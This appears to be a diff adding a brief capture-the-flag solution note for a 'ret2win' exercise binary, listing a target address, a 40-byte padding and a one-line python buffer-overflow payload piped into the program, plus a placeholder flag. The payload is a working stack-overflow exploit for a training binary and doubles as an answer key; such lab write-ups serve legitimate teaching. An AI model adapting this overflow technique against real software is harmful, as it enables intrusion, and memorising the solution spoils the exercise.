@@ -1,0 +1,7 @@
+Exploit: Standard Buffer Overflow
+
+Target Address: 0x0000000000400811
+Padding: 40 (see GDB)
+Payload: python -c 'print "a"*40 + "\x11\x08\x40\x00\x00\x00\x00\x00"' | ./ret2win
+
+Flag: ROPE{a_placeholder_32byte_flag!}
